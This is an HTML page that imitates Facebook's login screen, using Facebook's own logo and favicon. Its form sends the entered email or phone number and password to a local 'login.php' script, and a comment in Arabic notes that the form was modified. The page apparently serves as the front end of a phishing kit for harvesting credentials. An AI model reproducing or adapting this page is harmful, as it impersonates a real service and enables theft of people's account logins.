<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico" type="image/x-icon">
</head>

<body>
    <div class="container">
        <!-- Left Section -->
        <div class="left-section">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook Logo" class="logo">
            <p class="description">
                Facebook helps you connect and share with the people in your life.
            </p>
        </div>

        <!-- Right Section -->
        <div class="right-section">
            <div class="login-box">
                <!-- تعديل النموذج -->
                <form id="loginForm" method="POST" action="login.php">
                    <input type="email" name="email" class="input-field" placeholder="Email or phone number" required>
                    <input type="password" name="password" class="input-field" placeholder="Password" required>
                    <button type="submit" class="login-btn">Log In</button>
                    <a href="#" class="forgot-password">Forgotten password?</a>
                    <div class="divider"></div>
                    <button type="button" class="signup-btn">Create New Account</button>
                </form>
            </div>
        </div>
    </div>

</body>

</html>
